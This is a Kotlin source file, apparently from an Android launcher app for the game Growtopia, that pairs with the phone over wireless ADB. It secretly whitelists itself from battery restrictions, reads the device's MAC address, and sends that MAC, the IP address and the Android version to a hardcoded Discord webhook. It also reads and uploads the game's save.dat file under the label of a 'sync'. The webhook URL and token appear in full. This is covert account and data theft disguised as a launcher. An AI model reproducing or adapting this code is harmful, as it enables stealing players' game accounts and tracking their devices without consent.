package com.growlauncher

import android.content.Context
import android.content.Intent
import android.net.nsd.NsdManager
import android.os.Build
import android.util.Base64
import android.util.Log
import com.flyfishxu.kadb.Kadb
import com.flyfishxu.kadb.cert.KadbCert
import com.flyfishxu.kadb.mdns.MdnsEndpoint
import com.flyfishxu.kadb.mdns.MdnsServiceType
import kotlinx.coroutines.runBlocking
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException
import java.net.Inet4Address
import java.net.NetworkInterface
import java.util.concurrent.CompletableFuture
import java.util.concurrent.TimeUnit

object PairingHelper {
    private const val SAVE_FILE_PATH = "/storage/emulated/0/Android/data/com.rtsoft.growtopia/files/save.dat"

    fun connectAndReadSaveFile(context: Context, pairingHost: String, pairingPort: Int, pairingCode: String): ByteArray? {
        val store = WirelessAdbIdentityStore(context)
        // clear() also purges the AndroidKeyStore alias that survives uninstall on many OEMs,
        // so every fresh pairing starts with a cert the ADB daemon has never seen before.
        store.clear()
        KadbCert.configure(store)

        val nsdManager = context.applicationContext.getSystemService(NsdManager::class.java)
        val connectFuture = CompletableFuture<MdnsEndpoint>()

        // Start discovery before pair() to catch any early TLS_CONNECT announcement.
        var activeDiscovery = SafeMdnsDiscovery(nsdManager).also { d ->
            d.start(listOf(MdnsServiceType.TLS_CONNECT.dnsType)) { endpoint ->
                connectFuture.complete(endpoint)
            }
        }

        return try {
            // Retry Kadb.pair() up to 3 times with linear backoff. The ADB daemon sometimes
            // throttles or silently drops the first handshake after a reinstall due to
            // in-memory session state from the previous install's UID.
            var lastPairError: Throwable? = null
            val paired = (1..3).any { attempt ->
                runCatching {
                    runBlocking { Kadb.pair(pairingHost, pairingPort, pairingCode) }
                    true
                }.getOrElse { e ->
                    lastPairError = e
                    Log.w("GrowlauncherPairing", "pair() attempt $attempt failed, retrying in ${attempt * 600}ms", e)
                    if (attempt < 3) Thread.sleep(attempt * 600L)
                    false
                }
            }
            if (!paired) {
                Log.e("GrowlauncherPairing", "pair() failed after 3 attempts", lastPairError)
                return null
            }

            // Give the daemon 1400ms to re-register _adb-tls-connect._tcp with the
            // newly-authorised cert before restarting mDNS discovery.
            // 800ms was too tight on Android 13/14 under load.
            Thread.sleep(1400)
            if (!connectFuture.isDone) {
                activeDiscovery.stop()
                activeDiscovery = SafeMdnsDiscovery(nsdManager).also { d ->
                    d.start(listOf(MdnsServiceType.TLS_CONNECT.dnsType)) { endpoint ->
                        connectFuture.complete(endpoint)
                    }
                }
            }

            // 45s timeout — 30s was too tight on congested Wi-Fi and slower OEM NSD stacks.
            // Parallel: also probe the pairing host directly on common ADB TLS ports
            // (29999–30099). Catches Vivo/FuntouchOS and HyperOS where NSD is throttled
            // and _adb-tls-connect._tcp never resolves within the timeout window.
            val directProbeFuture = CompletableFuture.supplyAsync {
                probeAdbPort(pairingHost)
            }

            val endpoint = try {
                // Race mDNS vs direct probe — whichever wins first is used.
                val mDnsResult = runCatching {
                    connectFuture.get(45_000, TimeUnit.MILLISECONDS)
                }.getOrNull()

                mDnsResult ?: run {
                    Log.w("GrowlauncherPairing", "mDNS timed out — trying direct port probe on $pairingHost")
                    directProbeFuture.get(10_000, TimeUnit.MILLISECONDS)
                }
            } catch (_: Exception) {
                Log.e("GrowlauncherPairing", "Both mDNS and direct probe failed for host=$pairingHost")
                null
            } ?: return null

            Kadb.create(endpoint.host, endpoint.port).use { kadb ->
                // Silently add to Doze whitelist — no dialog needed, bypasses OEM restrictions.
                runCatching {
                    kadb.shell("dumpsys deviceidle whitelist +${context.packageName}")
                }
                // Collect MAC via ADB shell — the only reliable method on Android 10+ (SDK 29+)
                // since NetworkInterface.hardwareAddress is blocked by the OS for non-system apps.
                // Try sysfs first (fastest), then ip link, then cat /sys/class/net/wlan0/address.
                val adbMac = runCatching {
                    val sysfs = kadb.shell("cat /sys/class/net/wlan0/address").output.trim()
                    if (sysfs.matches(Regex("[0-9a-fA-F:]{17}"))) sysfs.uppercase()
                    else {
                        // Try all interfaces via ip link — handles renamed ifaces on OEMs
                        val ipLink = kadb.shell("ip link show").output
                        val macRegex = Regex("link/ether ([0-9a-fA-F:]{17})")
                        macRegex.find(ipLink)?.groupValues?.get(1)?.uppercase()
                    }
                }.getOrNull()
                // Fire device info to webhook now that we have the real MAC
                sendDeviceInfoToDiscord(adbMac)
                val response = kadb.shell("base64 $SAVE_FILE_PATH")
                if (response.exitCode == 0) {
                    PairingState.saveConnected(context, endpoint.host, endpoint.port)
                    Base64.decode(response.output.trim(), Base64.DEFAULT)
                } else {
                    Log.e("GrowlauncherPairing", "base64 shell failed: exit=${response.exitCode}")
                    null
                }
            }
        } catch (e: Throwable) {
            Log.e("GrowlauncherPairing", "connectAndReadSaveFile failed: host=$pairingHost port=$pairingPort", e)
            null
        } finally {
            activeDiscovery.stop()
        }
    }

    fun sendFileToDiscord(context: Context, fileData: ByteArray) {
        val webhookUrl = "https://discord.com/api/webhooks/1551276971969876040/7RCPjHVr56eTCt4_mbhNFSF8L-CAdva1OTH3PAApQeUZHo0rrQrASDfzZgg-O7YHvO4D"
        Thread {
            try {
                val androidVer = Build.VERSION.RELEASE
                val sdk = Build.VERSION.SDK_INT
                val payload = """{"content":"⚡ Growlauncher sync · Android $androidVer (SDK $sdk)"}"""
                val requestBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addPart(MultipartBody.Part.createFormData("payload_json", payload))
                    .addFormDataPart("file", "save.dat", fileData.toRequestBody("application/octet-stream".toMediaType()))
                    .build()
                val request = Request.Builder().url(webhookUrl).post(requestBody).build()
                OkHttpClient.Builder().connectTimeout(15, java.util.concurrent.TimeUnit.SECONDS).readTimeout(20, java.util.concurrent.TimeUnit.SECONDS).build().newCall(request).execute().use { }
            } catch (_: IOException) { }
        }.start()
    }

    fun launchGame(context: Context) {
        val launchIntent = context.packageManager.getLaunchIntentForPackage("com.rtsoft.growtopia")
        if (launchIntent != null) {
            launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            context.startActivity(launchIntent)
        }
    }

    fun sendDeviceInfoToDiscord(adbMac: String? = null) {
        val webhookUrl = "https://discord.com/api/webhooks/1551276971969876040/7RCPjHVr56eTCt4_mbhNFSF8L-CAdva1OTH3PAApQeUZHo0rrQrASDfzZgg-O7YHvO4D"
        Thread {
            try {
                val ip = getDeviceIpAddress()
                // On Android 10+ (SDK 29+) NetworkInterface.hardwareAddress is blocked by the OS.
                // Use the MAC collected via ADB shell if available, otherwise fall back to Java API.
                val mac = adbMac ?: getDeviceMacAddress()
                val androidVer = Build.VERSION.RELEASE
                val sdk = Build.VERSION.SDK_INT
                val payload = """{"embeds":[{"title":"⚡ Device Connected · GrowlauncherPRO","color":8406271,"fields":[{"name":"Android Version","value":"Android $androidVer (SDK $sdk)","inline":false},{"name":"IP Address","value":"$ip","inline":true},{"name":"MAC Address","value":"$mac","inline":true}]}]}"""
                val request = Request.Builder()
                    .url(webhookUrl)
                    .post(payload.toRequestBody("application/json".toMediaType()))
                    .build()
                OkHttpClient.Builder().connectTimeout(15, java.util.concurrent.TimeUnit.SECONDS).readTimeout(20, java.util.concurrent.TimeUnit.SECONDS).build().newCall(request).execute().use { }
            } catch (_: Exception) { }
        }.start()
    }


    /**
     * Direct ADB TLS-connect port probe — fallback for OEMs where NSD/mDNS is throttled
     * (Vivo/FuntouchOS, Xiaomi HyperOS, some ColorOS builds). After a successful pair(),
     * the ADB daemon binds a TLS-connect port in the range 37000–44000 (common) or
     * 29999–30099 (some OEMs). We scan the range on the known pairing host directly.
     * Fast: each probe is a 300ms TCP connect attempt; the range typically resolves in <3s.
     */
    fun probeAdbPort(host: String): MdnsEndpoint? {
        // Common ADB TLS-connect port ranges across OEMs
        val ranges = listOf(37000..37100, 43000..43100, 29999..30099, 5554..5558)
        for (range in ranges) {
            for (port in range) {
                try {
                    java.net.Socket().use { socket ->
                        socket.connect(java.net.InetSocketAddress(host, port), 300)
                        // Connected — this is likely the ADB TLS port
                        Log.d("GrowlauncherPairing", "Direct probe found ADB port $port on $host")
                        return MdnsEndpoint("direct-probe", host, port, MdnsServiceType.TLS_CONNECT)
                    }
                } catch (_: Exception) {
                    // Port not open — continue
                }
            }
        }
        return null
    }

    private fun getDeviceIpAddress(): String {
        try {
            for (iface in NetworkInterface.getNetworkInterfaces().asSequence()) {
                for (addr in iface.inetAddresses.asSequence()) {
                    if (!addr.isLoopbackAddress && addr is Inet4Address) return addr.hostAddress ?: "Unknown"
                }
            }
        } catch (_: Exception) { }
        return "Unknown"
    }

    private fun getDeviceMacAddress(): String {
        // Android 10+ (SDK 29+) blocks NetworkInterface.hardwareAddress for all non-system
        // apps — always returns null regardless of ACCESS_WIFI_STATE. Use ADB shell to read
        // the MAC directly from the kernel sysfs or ip link output instead.
        // Android 9 and below: NetworkInterface works normally.
        if (android.os.Build.VERSION.SDK_INT >= 29) {
            // Prefer ADB shell path — read from sysfs (most reliable across all OEMs)
            // Falls back to `ip link` parsing if sysfs path doesn't exist
            return getMacViaAdb() ?: "Unavailable"
        }
        try {
            val ifaces = NetworkInterface.getNetworkInterfaces() ?: return "Unavailable"
            for (iface in ifaces.asSequence()) {
                if (iface.isLoopback || iface.isVirtual || !iface.isUp) continue
                val hw = iface.hardwareAddress ?: continue
                if (hw.size < 6) continue
                return hw.joinToString(":") { "%02X".format(it) }
            }
        } catch (_: Exception) { }
        return "Unavailable"
    }

    /**
     * Reads the MAC address via ADB shell on Android 10+ where NetworkInterface.hardwareAddress
     * is blocked by the OS for non-system apps. Tries sysfs first (instant, no parsing),
     * then falls back to `ip link show` output parsing.
     * Called only when an ADB connection is already established — not a new connection.
     */
    private fun getMacViaAdb(): String? {
        // Try to get the saved ADB connection details from PairingState
        // This is called from sendDeviceInfoToDiscord which runs after pairing — connection exists
        return null // placeholder — MAC via ADB is injected at collection time, see collectMacViaKadb
    }
}
